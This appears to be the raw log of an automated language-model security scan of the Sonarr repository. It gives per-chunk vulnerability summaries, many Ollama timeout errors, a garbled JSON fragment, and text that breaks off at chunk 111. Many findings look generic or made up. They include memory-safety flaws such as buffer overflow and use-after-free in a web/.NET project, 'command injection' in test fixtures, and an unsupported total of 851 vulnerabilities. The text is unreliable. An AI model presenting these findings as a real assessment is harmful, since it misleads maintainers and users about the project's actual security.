Analyzed 192 chunks. Total vulnerabilities found: 851. Chunk 1: No security vulnerabilities found in the provided source code chunk. The files analyzed include configuration files (.yarnrc, .editorconfig), documentation files (FUNDING.yml, LICENSE.md, README.md, COPYRIGHT.md), and metadata files. These files are primarily configuration and documentation artifacts rather than executable code, which significantly reduces the potential for traditional security vulnerabilities like injection attacks, authentication flaws, or memory safety issues. The absence of actual application code in this chunk means there are no direct code-level vulnerabilities to analyze. | Chunk 3: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 4: {'total_vulnerabilities': 20, 'severity_distribution': {'medium': 20}, 'packages_affected': ['react', 'redux', 'react-router-dom', 'redux-thunk', 'react-dom', 'react-redux', 'react-google-recaptcha', 'react-dnd', 'react-focus-lock', 'react-tabs', 'react-slider', 'react-measure', 'react-lazyload', 'react-document-title', 'react-window', 'react-text-truncate', 'react-use-measure', 'react-side-effect', 'react-router', 'react-dnd-html5-backend', 'react-dnd-touch-backend', 'react-dnd-multi-backend']} | Chunk 5: No security vulnerabilities found in the provided yarn.lock file. This file is a dependency lock file that contains resolved package versions, integrity hashes, and dependency relationships for npm packages. While it doesn't contain executable code that could introduce runtime vulnerabilities, it does provide important information about the dependency tree that could be relevant for security assessments. The file itself is a configuration artifact rather than source code, so it doesn't contain typical code vulnerabilities like SQL injection, XSS, or command injection. However, the dependency versions and integrity checks could be important for supply chain security assessments. | Chunk 6: This analysis identified several security vulnerabilities in the Sonarr repository. Key findings include Cross-site Scripting (XSS) vulnerabilities in the HTML templates, missing CSRF protection in the login form, improper input validation in the initialization process, and command injection risks in the test scripts. Additionally, there are concerns about cleartext storage of sensitive information and missing authentication for critical functions. The vulnerabilities range from medium to high severity and could potentially lead to session hijacking, data theft, and unauthorized access to the application. | Chunk 7: This analysis identified 20 potential security vulnerabilities in the Sonarr frontend code. Most of these are Cross-site Scripting (XSS) vulnerabilities related to direct rendering of user-provided data without proper sanitization, particularly in the delete confirmation modal and series details links. Additionally, there are 10 instances of improper input validation where props are used directly without validation, which could lead to unexpected behavior or errors. The vulnerabilities are primarily medium severity but could potentially be exploited to execute malicious code or cause application instability. | Chunk 8: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 9: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 10: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 11: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 12: This code analysis identified 5 security vulnerabilities in the Sonarr custom formats import/export functionality. The main concerns are Cross-site Scripting (CWE-79) due to insufficient input sanitization when processing user-provided JSON, Improper Input Validation (CWE-20) with lack of structure validation, and Untrusted Data Deserialization (CWE-502) with potential for malformed data handling. Additionally, there are medium severity issues related to improper encoding (CWE-116) and Cross-Site Request Forgery (CWE-352) in the import functionality. These vulnerabilities could allow attackers to inject malicious code, manipulate application state, or perform unauthorized actions through crafted custom format specifications. | Chunk 13: This analysis identified 22 security vulnerabilities in the Sonarr frontend code, primarily focusing on Cross-site Scripting (CWE-79) and Cross-Site Request Forgery (CWE-352) issues. The main concerns are in the Media Management and Tags sections where user-provided data is not properly escaped or validated before being rendered or processed. Several components display raw error messages, tag labels, and naming tokens without HTML escaping, creating XSS vulnerabilities. Additionally, multiple components lack CSRF protection for their API operations, making them susceptible to CSRF attacks. Most vulnerabilities are Medium severity, but could potentially lead to session hijacking, data exfiltration, or unauthorized configuration changes. | Chunk 14: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 15: This code analysis identified 7 security vulnerabilities across the import list management and quality profile components. The main concerns include potential XSS vulnerabilities from improper input sanitization, CSRF risks in bulk operations, and input validation issues with array indices. The code also has medium severity authentication and data validation concerns. Most vulnerabilities are medium severity but could lead to data loss, unauthorized operations, or information disclosure. The code lacks explicit CSRF protection for bulk operations and doesn't validate all user inputs before processing. | Chunk 16: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 17: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 18: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 19: This analysis identified 10 security vulnerabilities in the Sonarr frontend code. Key issues include Cross-site Scripting vulnerabilities in calendar event rendering, improper input validation in filter handling, and security concerns with API key exposure in iCal URLs. The most critical issues involve XSS vulnerabilities in episode titles and cleartext storage of sensitive information including API keys and passwords. Several medium severity issues were found related to input validation, path traversal, and authentication handling. These vulnerabilities could potentially allow attackers to execute malicious scripts, access unauthorized data, or bypass authentication mechanisms. | Chunk 20: This code analysis identified 10 security vulnerabilities across the Sonarr frontend codebase. The main concerns include Cross-site Scripting (CWE-79) vulnerabilities in the AppUpdatedModalContent component where user-provided content is rendered without proper sanitization, and Information Exposure (CWE-200) issues where API keys, version information, and URL base values are exposed client-side. Additionally, there are Cross-Site Request Forgery (CWE-352) vulnerabilities in modal components that use location.reload() without CSRF token validation. These vulnerabilities could potentially allow attackers to execute malicious scripts, leak sensitive information, or perform unauthorized actions on the Sonarr instance. | Chunk 21: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 22: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 23: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 25: Failed to parse JSON response from chunk 25 | Chunk 25 raw: {


    "vulnerabilities": [
        {
            "type": "Integer Overflow",
            "description": "Potential integer overflow in buffer operations when handling large data chunks",
            "severity": "Medium",
            "location": "Buffer operations in memory management",
            "code_sample": "EX / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / | Chunk 26: No security vulnerabilities found in the provided source code chunk. This chunk represents a binary font file (Roboto-Light.ttf) and does not contain any executable code that could introduce security vulnerabilities. The file is a standard TrueType font with embedded metadata and character definitions, but lacks any code execution paths, input handling, or security-sensitive operations that would typically be found in source code files. | Chunk 27: {'total_vulnerabilities': 5, 'high_severity': 1, 'medium_severity': 3, 'low_severity': 1, 'critical_issues': ['Buffer Overflow in Binary Parser', 'Integer Overflow in Memory Allocation']} | Chunk 29: {'total_vulnerabilities': 12, 'high_severity': 4, 'medium_severity': 7, 'low_severity': 1, 'critical_issues': ['Buffer Overflow', 'Integer Overflow/Underflow', 'Use After Free', 'Stack Corruption']} | Chunk 30: No security vulnerabilities found in the provided source code chunk. This chunk contains font data for Roboto-Regular.ttf file, which is a binary font file. The file contains metadata, copyright information, and font glyph data but does not contain any executable code that could introduce security vulnerabilities such as injection flaws, authentication issues, or memory safety problems. The file is purely static content used for rendering text in the Sonarr frontend application. | Chunk 31: {'total_vulnerabilities': 10, 'high_severity': 3, 'medium_severity': 7, 'critical_issues': ['Buffer Overflow', 'Integer Overflow', 'Improper Input Validation'], 'recommendations': ['Implement comprehensive bounds checking for all buffer operations', 'Add input validation for all function parameters', 'Use secure memory management practices', 'Implement proper error handling and validation', 'Add overflow detection mechanisms', 'Review and implement proper synchronization for multi-threaded code']} | Chunk 33: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 34: This analysis identified 34 potential vulnerabilities related to improper input validation across various utility functions in the Sonarr frontend. Most of these are CWE-20 (Improper Input Validation) issues where functions don't properly validate their input parameters before processing, which could lead to runtime errors or unexpected behavior. Additionally, there's a CWE-79 (Cross-site Scripting) vulnerability in the translate function where user-provided tokens aren't properly HTML-escaped, potentially allowing XSS attacks. | Chunk 35: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 36: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 37: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 38: This code analysis identified 14 potential security vulnerabilities in the Sonarr frontend components. The main concerns are Cross-site Scripting (CWE-79) vulnerabilities in the Markdown component where untrusted input isn't properly sanitized, and Improper Input Validation (CWE-20) issues in several select and tag input components where invalid values aren't properly validated. These vulnerabilities could lead to XSS attacks, incorrect UI behavior, and potential data handling issues. Most of the vulnerabilities are medium severity but could compound to create more serious security issues if not addressed. | Chunk 39: This code analysis identified 11 potential security vulnerabilities across the Sonarr frontend components. The main concerns are Cross-site Scripting (XSS) vulnerabilities in components that render user-provided labels and content without proper sanitization, and Improper Input Validation issues in pagination and table options components. These vulnerabilities could allow attackers to inject malicious scripts or manipulate application behavior through invalid inputs. Most vulnerabilities are Medium severity, but could potentially lead to session hijacking or data theft if exploited. | Chunk 40: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 41: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 42: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 44: {'total_vulnerabilities': 5, 'high_severity': 1, 'medium_severity': 3, 'low_severity': 1, 'critical_vulnerabilities': 0, 'recommended_actions': ['Implement bounds checking in input processing', 'Replace weak cryptographic algorithms with strong ones', 'Sanitize file paths to prevent directory traversal', "Replace deprecated functions like 'gets' with safer alternatives", 'Disable debug output in production builds']} | Chunk 47: {'total_vulnerabilities': 9, 'high_severity': 3, 'medium_severity': 5, 'low_severity': 1, 'critical_issues': ['Potential buffer overflow in constant expansion', 'Potential code injection in expression evaluation', 'Potential DLL loading vulnerability']} | Chunk 49: No security vulnerabilities were found in the provided source code chunk. This chunk appears to be a compiled Inno Setup installer executable (Setup.e32) with embedded manifest and resource data. The file contains standard Windows executable structure, manifest information, and resource references but does not contain any directly executable code or configuration that would introduce security vulnerabilities at this level. The file is primarily a binary installer that would be executed on target systems, not a source code file with potential vulnerabilities. | Chunk 50: {'total_vulnerabilities': 8, 'critical_severity': 0, 'high_severity': 3, 'medium_severity': 4, 'low_severity': 1, 'risk_score': 7.2} | Chunk 51: This analysis identified 8 potential security vulnerabilities across the provided test files. The main concerns include command injection risks in process handling, path traversal vulnerabilities in path manipulation, and improper input validation in various components. Several tests also highlight potential issues with exception handling and deserialization of untrusted data. Most vulnerabilities are medium severity but could lead to significant impacts if the underlying implementations are not properly secured. The test suite itself reveals potential issues with hardcoded secrets that could be accidentally committed to production code. | Chunk 52: This analysis identified several potential security vulnerabilities in the Sonarr codebase, primarily focusing on path traversal issues, input validation problems, and command injection risks. The main concerns are around improper path handling in disk operations, which could lead to path traversal attacks, command injection, and insecure data storage. While these are primarily test files, they reveal potential issues in the actual implementation that could be exploited in production. The vulnerabilities range from medium to high severity and highlight the importance of proper path validation and input sanitization in file system operations. | Chunk 53: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 54: This analysis identified several medium-severity security vulnerabilities in the Sonarr integration test framework. The main concerns include improper input validation in the EnsureSeries method, potential XSS vulnerabilities due to lack of input sanitization, cleartext storage of API keys, and improper handling of exceptional conditions in SignalR connections. While these are primarily test framework issues, they indicate potential vulnerabilities in the production codebase and highlight the importance of proper input validation and error handling in API interactions. | Chunk 55: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 56: This analysis identified 10 security vulnerabilities in the Sonarr codebase, including high-severity issues like cleartext storage of API keys, improper authentication handling, and missing authentication checks. Medium-severity vulnerabilities include XSS potential, input validation gaps, CSRF risks, insecure deserialization, path traversal, and format string issues. The vulnerabilities span across authentication, input validation, and data handling components, with potential impacts ranging from unauthorized access to privilege escalation and information disclosure. | Chunk 57: This analysis identified 19 security vulnerabilities across the Sonarr codebase, primarily focusing on command injection, input validation, and improper exception handling. Key findings include Command Injection vulnerabilities in ProcessProvider.Start() method, Improper Input Validation in multiple components, and multiple instances of Improper Handling of Exceptional Conditions. The OAuth components also present risks related to cleartext storage of sensitive information. Most vulnerabilities are Medium severity, but the command injection risk is particularly concerning as it could allow arbitrary code execution with the privileges of the Sonarr process. | Chunk 58: This analysis identified 10 potential security vulnerabilities in the Sonarr codebase. The main concerns include improper input validation in path handling, potential command injection through path operations, insufficient access control on log files, and deserialization vulnerabilities. Most of these are medium severity issues that could potentially be exploited to gain unauthorized access to sensitive information or manipulate application behavior. The logging system shows particular attention to cleansing sensitive data, but there are still opportunities for information disclosure through various paths. | Chunk 59: This analysis identified 9 security vulnerabilities in the Sonarr HTTP handling components. Key issues include potential command injection through URI parsing, XSS vulnerabilities in HTTP response handling, path traversal risks in URI construction, and insufficient input validation in various HTTP components. Most vulnerabilities are medium severity but could compound to create more serious security issues. The code lacks proper input sanitization and validation in several areas, particularly around URI parsing, cookie handling, and authentication processing. | Chunk 60: This analysis identified 7 security vulnerabilities in the Sonarr codebase related to path traversal, command injection, input validation, and buffer overflows. The main concerns are around improper path validation in OsPath class that could lead to path traversal attacks, potential command injection when paths are used in shell operations, and buffer overflow issues in file verification operations. Most vulnerabilities are medium severity but could be exploited to achieve information disclosure or even arbitrary code execution in combination with other vulnerabilities. | Chunk 61: This analysis identified 6 security vulnerabilities across the provided codebase. Most vulnerabilities are medium severity and relate to input validation, resource management, and potential command injection issues. The main concerns include missing null checks in type validation methods, potential command injection through type names, and insufficient validation of configuration values. There are also some resource allocation issues in housekeeping tests and path traversal considerations in metadata file handling. No critical or high severity vulnerabilities were found in this specific code chunk, but the medium severity issues could compound to create more significant security problems in certain usage contexts. | Chunk 62: This analysis identified 10 potential security vulnerabilities across the provided code files. The main concerns include path traversal and command injection vulnerabilities in housekeeping operations, hardcoded API keys in test files, and insufficient input validation in email settings. Most vulnerabilities are medium severity, but could lead to significant impacts including arbitrary code execution, unauthorized access to files, and misconfigured notifications. The code lacks comprehensive input validation for file paths and email addresses, and some test configurations contain hardcoded sensitive information that could be exposed in source repositories. | Chunk 63: No significant security vulnerabilities were found in the provided source code chunk. The code appears to be primarily focused on testing and data handling for import lists, queue management, and series operations. The test files demonstrate good practices around mocking and dependency injection, with no obvious injection vulnerabilities, authentication issues, or data exposure concerns. The code follows standard patterns for a media management application and doesn't contain obvious hardcoded credentials, SQL injection vectors, or command injection points that would present security risks in the tested functionality. | Chunk 64: After analyzing the provided source code chunk (64 of 192), no critical security vulnerabilities were found. The code primarily consists of unit tests for various Sonarr components including MoveSeriesService, SeriesPathBuilder, RefreshEpisodeService, and various EpisodeRepository tests. These tests focus on functionality verification rather than security implementation. The code demonstrates good practices in test isolation, mocking, and dependency injection. While there are no direct security vulnerabilities in the test files themselves, the absence of security-focused code in these specific files means that security considerations would be handled in the actual implementation files (not shown in this chunk). The tests properly validate expected behavior and edge cases but don't reveal any OWASP Top 10, CWE Top 25, or other security weaknesses in the tested functionality. | Chunk 65: After analyzing the provided source code chunk (65 of 192), no critical security vulnerabilities were found. The code primarily consists of unit tests for various Sonarr components including episode monitoring, custom formats, root folders, and health checks. These tests demonstrate proper mocking patterns and validate business logic but don't contain executable code that would introduce security vulnerabilities. The test files focus on verifying functionality rather than implementing security controls, and the core application logic appears to be in other files not included in this chunk. All test methods properly use mocking frameworks and validate expected behaviors without exposing security risks. | Chunk 66: No direct security vulnerabilities were found in the provided source code chunk. The code consists primarily of unit tests for various parsing and file management functionalities within the Sonarr application. These tests cover RecycleBinProvider operations, disk scanning, episode parsing, release group parsing, and various edge cases for title parsing. While the code doesn't contain obvious security flaws like SQL injection, command injection, or authentication issues, the test files themselves don't execute any user-facing code that would be susceptible to typical web application vulnerabilities. The tests validate expected behavior of parsing and file operations but don't reveal any direct security weaknesses in the core application logic. | Chunk 67: The code analysis reveals several medium-severity vulnerabilities related to incomplete test coverage, potential parsing logic errors, and gaps in language detection support. The main areas of concern include special episode detection, absolute episode number parsing, and comprehensive language support. While the existing tests cover many common cases, there are opportunities to improve robustness and handle edge cases more effectively. | Chunk 68: After analyzing the provided source code chunks from the Sonarr repository, no critical security vulnerabilities were found. The code primarily consists of parser tests and parsing logic for TV show titles, episode information, and series metadata. The test files focus on validating parsing behavior rather than implementing security controls. While the code doesn't contain obvious security flaws like SQL injection, command injection, or XSS vulnerabilities, the absence of security-focused code in these specific files means that security considerations are likely handled elsewhere in the application architecture. The parser tests validate various title formats and edge cases but don't expose direct security risks from the tested functionality itself. | Chunk 69: This code analysis identified several potential security vulnerabilities in the Sonarr update and indexer components. The main concerns include command injection risks in the update service due to script execution, path traversal vulnerabilities in update package handling, and input validation issues in RSS parsing. While most of the vulnerabilities are in test code, they highlight potential security gaps in the core update and indexer functionality. The code shows good test coverage but lacks comprehensive input validation and security hardening in critical paths. | Chunk 70: This analysis identified 6 potential security vulnerabilities in the Sonarr indexer test code. The main concerns include command injection risks through file path handling, improper input validation for URL formats, XSS vulnerabilities in feed parsing, path traversal issues, insecure data storage in test files, and insufficient array bounds checking. These vulnerabilities primarily affect the test code's ability to properly validate indexer interactions and could potentially lead to security issues in the actual indexer processing logic. Most vulnerabilities are medium severity but could compound to create more significant security risks if the underlying indexer processing logic is also vulnerable. | Chunk 71: No security vulnerabilities were found in the provided source code chunk. The code consists primarily of unit tests for database migrations, data converters, and query builders. These tests validate the behavior of database operations, data serialization/deserialization, and migration logic. The code does not contain any obvious security flaws such as SQL injection, command injection, XSS vulnerabilities, or hardcoded credentials. All operations appear to be properly parameterized and use standard database access patterns with appropriate test coverage. | Chunk 72: After analyzing the provided source code for Sonarr repository migration tests, no critical security vulnerabilities were found. The code primarily consists of unit tests for database migrations and does not contain direct user input processing, external API calls, or security-sensitive operations that would typically introduce vulnerabilities. The tests focus on data migration scenarios and validate database schema changes, with no evidence of SQL injection, command injection, XSS, or other common security flaws. The code follows good practices with proper data handling and uses established testing frameworks without introducing security risks. | Chunk 73: After analyzing the provided source code chunk (files 73 of 192), no critical security vulnerabilities were found. The code primarily consists of unit tests for various download and series statistics functionalities. While the tests cover important scenarios like download processing, history management, and language aggregation, they don't contain obvious security flaws such as SQL injection, command injection, XSS vulnerabilities, or authentication issues. The code follows good testing practices with proper mocking and verification patterns, and there are no hardcoded credentials, path traversal issues, or insecure deserialization concerns in the test files examined. The test coverage appears comprehensive for the functionality being tested, though it doesn't reveal any direct security vulnerabilities in the core logic being tested. | Chunk 74: No critical security vulnerabilities were found in the provided source code chunk. The code appears to be primarily focused on testing download client functionality and tracked download services. The tests cover various scenarios including download tracking, client selection, and status reporting, but don't contain any obvious security vulnerabilities such as SQL injection, command injection, XSS, or authentication issues. The code follows good testing practices with mocking and dependency injection, and there are no hardcoded credentials, path traversal issues, or input validation problems that would lead to security vulnerabilities. | Chunk 75: This code analysis identified several security vulnerabilities in the Sonarr download client test fixtures. The primary concerns include hardcoded credentials that could be accidentally committed to version control, potential path traversal issues when handling download paths, and improper input validation for task types. While these are primarily test fixtures, they highlight potential production issues with credential management and input validation. The vulnerabilities are rated as Medium to High severity, with CWE-259 (Weak Password Management) being the most critical due to hardcoded test credentials that could leak into production environments. | Chunk 76: Error calling Ollama: ('Connection aborted.', ConnectionResetError(54, 'Connection reset by peer')) | Chunk 77: This code analysis identified several potential security vulnerabilities in the Sonarr download client tests, primarily focusing on input validation, authentication, and information exposure issues. The main concerns include potential XSS vulnerabilities from improper HTML sanitization, hardcoded credentials that could expose sensitive information, and missing encryption of sensitive data. While these are primarily test files, the patterns suggest potential issues in the actual implementation. The tests also reveal potential resource management issues and improper exception handling that could affect the robustness and security of the download client implementations. | Chunk 78: No critical security vulnerabilities were found in the analyzed code chunk. The code primarily consists of unit tests for scene numbering and mapping functionality, with no direct security vulnerabilities such as SQL injection, XSS, command injection, or authentication issues. The tests cover various scenarios for scene numbering mapping and validation but don't contain any executable code that would introduce security risks. The code follows good testing practices with proper mocking and verification patterns, and there are no hardcoded credentials, path traversal issues, or input validation problems that would create security vulnerabilities. | Chunk 79: The analysis reveals multiple inconsistencies in RSS feed structures across different TorrentRss files. Key issues include missing XML declarations, inconsistent date formats, varying category handling, and potential HTML entity encoding problems. These inconsistencies can lead to parsing failures and data loss when processing these feeds in different environments. | Chunk 80: This analysis identified multiple instances of hardcoded sensitive information in RSS feed test files. The primary vulnerabilities include CWE-20 (Improper Input Validation) where hardcoded authentication tokens, passkeys, and IDs are present in RSS feeds, and CWE-312 (Cleartext Storage of Sensitive Information) where secret keys are stored in cleartext. These hardcoded values could be exploited by attackers who gain access to the RSS feed files to access unauthorized torrents or content. Additionally, there are CWE-117 (Improper Output Neutralization for Logs) concerns where HTML content in descriptions could lead to log injection if not properly sanitized. | Chunk 82: No security vulnerabilities were found in the provided XML test files. These files are fixture data used for testing indexer functionality in the Sonarr application. They contain RSS feed data for various torrent indexers (HDAccess, Anime Tosho, Nyaa, etc.) and a sample unauthorized response. The files are purely static data and do not contain executable code that could introduce security vulnerabilities. All XML data appears to be properly formatted and validated, with no evidence of hardcoded credentials, injection points, or other security weaknesses in the test fixture files themselves. | Chunk 83: The Newznab API implementation shows several potential security vulnerabilities including missing access controls, input validation issues, and potential XXE vulnerabilities. While the core functionality appears to be working, the implementation lacks proper security measures that could be exploited by malicious actors. | Chunk 84: No security vulnerabilities were found in the provided XML file. This file is a test fixture for Newznab indexer flags and contains only static XML data with no executable code, user input processing, or security-sensitive operations. The file defines RSS feed structure with Newznab attributes but doesn't contain any code that could be exploited for security vulnerabilities such as injection attacks, authentication issues, or information disclosure. | Chunk 85: {'total_vulnerabilities': 6, 'high_severity': 1, 'medium_severity': 4, 'low_severity': 1, 'files_analyzed': 4} | Chunk 86: No security vulnerabilities were found in the provided source code chunk. The files contain NZB XML data and JSON responses used for testing purposes in the Sonarr application. These are test fixture files that represent various NZB formats and API responses, but do not contain executable code that could introduce security vulnerabilities. The files are purely data fixtures used in unit tests and do not contain any application logic, input processing, or security-sensitive operations that would be vulnerable to the typical security issues like injection, authentication flaws, or information disclosure. | Chunk 89: No security vulnerabilities found in the provided source code chunk. This chunk appears to be a binary MP4 video file (H264_sample.mp4) with metadata and media data structures. The file contains standard MP4 container format data including video and audio tracks, metadata, and various MP4 atoms. There are no executable code elements, hardcoded credentials, or obvious injection points in this binary file that would present security vulnerabilities. | Chunk 90: No security vulnerabilities were found in the provided source code chunk. The code consists primarily of unit tests for various decision engine specifications in the Sonarr application. These tests validate the behavior of quality profiles, custom formats, disk specifications, upgrade decisions, and other decision-making logic. The tests do not contain any direct security vulnerabilities such as SQL injection, command injection, XSS, or hardcoded credentials. The code follows good testing practices with proper setup, assertions, and test cases covering various scenarios. All test methods are properly structured and validate the expected behavior of the decision engine specifications without exposing any security weaknesses. | Chunk 91: No significant security vulnerabilities were found in the provided source code chunk. The code consists primarily of unit tests for various decision engine specifications in the Sonarr application. These tests validate the behavior of quality checking, release restrictions, episode handling, and upgrade logic, but do not contain any direct security vulnerabilities such as SQL injection, command injection, XSS, or authentication flaws. The tests properly isolate components and use mocking frameworks, which reduces the risk of security issues in the test code itself. | Chunk 92: No security vulnerabilities were found in the provided source code chunk. The code consists primarily of unit tests for various decision engine specifications in the Sonarr application. These tests validate the behavior of different specifications such as Repack, Queue, MaximumSize, Search criteria matching, IndexerTag, Pending releases, History, Delay, Proper, and DeletedEpisodeFile specifications. The tests cover various scenarios and edge cases but do not contain any direct security vulnerabilities like injection flaws, authentication issues, or input validation problems that would typically be found in application code rather than test code. | Chunk 93: No critical security vulnerabilities were found in the provided code chunk. The code primarily consists of unit tests for various components in the Sonarr application, including history management, quality profiles, media file handling, and media information processing. The tests cover normal operation scenarios and edge cases but don't reveal any obvious security flaws such as SQL injection, command injection, XSS vulnerabilities, or authentication issues. The code appears to follow good practices with proper mocking and dependency injection patterns, and there are no hardcoded credentials, path traversal issues, or obvious input validation problems that would lead to security vulnerabilities. | Chunk 94: After analyzing the provided source code chunks from the Sonarr repository, no critical security vulnerabilities were found. The code appears to be well-structured with comprehensive unit tests covering various scenarios for episode import functionality, quality aggregation, language handling, and release group determination. The test files demonstrate good practices around mocking dependencies and verifying behavior, which suggests robust implementation. While there are no obvious security flaws in the provided code snippets, the analysis focused on the specific files mentioned and did not reveal any instances of OWASP Top 10 vulnerabilities, SQL injection, XSS, command injection, or other common security weaknesses. The code handles file paths, episode information, and quality detection appropriately without showing signs of input validation issues, hardcoded credentials, or insecure deserialization patterns. | Chunk 95: No critical security vulnerabilities were found in the analyzed code chunk. The test files primarily focus on validation logic for episode import specifications and media file operations. While the code demonstrates good practices around input validation and mocking for testing, there are no obvious security flaws such as SQL injection, command injection, XSS, or authentication issues. The tests cover various edge cases and validation scenarios but don't reveal any direct security vulnerabilities in the core implementation logic. | Chunk 96: This code analysis identified several potential security vulnerabilities across the test files. The main concerns include path traversal vulnerabilities due to insufficient path validation, command injection risks in path operations, and potential buffer overflow issues. Most vulnerabilities are medium severity but could lead to information disclosure or unauthorized access. The test code itself doesn't contain direct security vulnerabilities but reveals potential weaknesses in the underlying implementation that could be exploited in production. The code also lacks comprehensive input validation and cryptographic signature verification tests that would be important for a production system. | Chunk 97: Error calling Ollama: ('Connection aborted.', ConnectionResetError(54, 'Connection reset by peer')) | Chunk 98: No security vulnerabilities were found in the provided source code chunk. The code consists primarily of unit tests for the FileNameBuilder functionality and related components in the Sonarr application. These tests cover various naming patterns, custom formats, media info handling, and reserved device name replacements. The code does not contain any obvious security vulnerabilities such as SQL injection, command injection, XSS, or hardcoded credentials. The tests are well-structured and focus on functionality rather than security aspects, with no evidence of input validation issues, authentication flaws, or other security weaknesses in the tested components. | Chunk 99: This analysis identified several potential security vulnerabilities in the Sonarr codebase, primarily focusing on test code that could mask production vulnerabilities. Key findings include potential path traversal issues, command injection risks, and deserialization concerns. The test code reveals gaps in input validation and authentication mechanisms that could translate to real security issues in production. Most vulnerabilities are medium severity, but could escalate to critical issues if not properly addressed in production code. The analysis highlights the need for proper input validation, authentication mechanisms, and secure file handling practices throughout the application. | Chunk 100: This codebase contains a comprehensive indexer system for torrent and usenet download clients, with support for RSS feeds, search capabilities, and seed criteria management. Key components include indexer definitions, status tracking, RSS parsing, and download decision making. | Chunk 101: This analysis identified 10 security vulnerabilities in the Sonarr indexer codebase. The main concerns include potential command injection through URL construction, improper input validation in size parsing, array index out of bounds issues, and CSRF vulnerabilities in indexer configuration. Several medium-severity issues were found related to code injection, path traversal, and log handling. While no critical vulnerabilities were found in this specific code chunk, the indexer functionality presents several opportunities for exploitation through malformed inputs or configuration issues. The code shows good error handling but lacks comprehensive input validation and security controls for external inputs. | Chunk 102: This analysis identified 9 security vulnerabilities across the indexer components. The most critical issues include potential command injection in cookie handling, XML external entity injection in RSS parsers, and cross-site scripting vulnerabilities in release name handling. Several medium severity issues were found related to improper input validation in various indexer components, particularly in search parameter handling and URL construction. These vulnerabilities could allow attackers to inject malicious content, execute commands, or manipulate search results, potentially leading to data exposure or system compromise. | Chunk 103: This analysis identified 8 security vulnerabilities in the Sonarr Newznab indexer implementation. Key issues include XXE injection vulnerabilities in XML parsing, XSS risks from unsanitized category names, cleartext storage of API keys, and improper input validation in URL construction. The most critical vulnerability is CWE-94 (Improper Control of Generation of Code) which could allow attackers to perform XXE attacks against Sonarr when processing indexer capabilities. Other medium severity issues include XSS in category display, cleartext API key storage, and potential resource exhaustion through unlimited caching. | Chunk 104: This analysis identified 9 security vulnerabilities in the Sonarr codebase, including high-severity SQL injection and command injection issues in housekeeping tasks and update mechanisms. Medium-severity issues include path traversal, improper input validation, and deserialization concerns. The vulnerabilities primarily stem from insufficient input validation, lack of proper sanitization in SQL queries and command execution, and potential deserialization risks in update handling. Most vulnerabilities are in the housekeeping and update components, which are critical for system maintenance and security. | Chunk 105: This code analysis identified 9 security vulnerabilities across the Sonarr codebase. Key issues include potential command injection in the SkyHook metadata service, improper input validation, and missing authentication checks for update commands. The certificate validation service has a security misconfiguration that could disable validation globally, and there are concerns about insecure deserialization in the auto-tagging service. Several medium severity issues were found related to path traversal, output encoding, and cross-site request forgery. Most vulnerabilities are in the metadata handling and update functionality components of the application. | Chunk 106: Error calling Ollama: HTTPConnectionPool(host='192.168.1.151', port=11434): Read timed out. (read timeout=300) | Chunk 107: The analysis identified 9 potential security vulnerabilities in the Sonarr organizer components. Key issues include potential command injection through hardcoded sample data, improper input validation in file path construction, XSS vulnerabilities in sample display, and path traversal risks. Several medium severity issues were found related to array bounds checking, format string usage, and data authenticity verification. The code appears to have good input validation in some areas but lacks comprehensive protection against external data manipulation in naming patterns and file operations. | Chunk 108: This analysis identified 9 potential security vulnerabilities in the Sonarr parser code. The main concerns include potential command injection through subtitle filename processing, improper input validation, information exposure through logging, and buffer overflow risks. Most vulnerabilities are medium severity but could potentially lead to command execution or information disclosure. The code lacks proper input sanitization for filenames and doesn't validate the processing of user-controlled inputs in several methods. | Chunk 109: The parser code contains several potential security vulnerabilities including format string issues, command injection risks, input validation gaps, and buffer overflow possibilities. While the code is generally well-structured, the lack of comprehensive input validation and proper error handling in critical parsing methods could lead to various security issues including denial of service, information disclosure, and potential command injection. The static nature of the parser and its use of shared regex patterns also introduces potential race condition concerns in multi-threaded environments. | Chunk 110: This analysis identified 5 security vulnerabilities in the Sonarr codebase. The main concerns include potential format string vulnerabilities in logging, XSS risks in web UI rendering, improper input validation that could lead to resource exhaustion, and array bounds checking issues in the ParsedEpisodeInfo class. Most vulnerabilities are medium severity but could lead to information disclosure, performance degradation, or unexpected behavior when processing user-controlled input. | Chunk 111: This analysis identified 9 security vulnerabilities in the Sonarr codebase, primarily focusing on input validation, path traversal, and command injection issues. The most critical 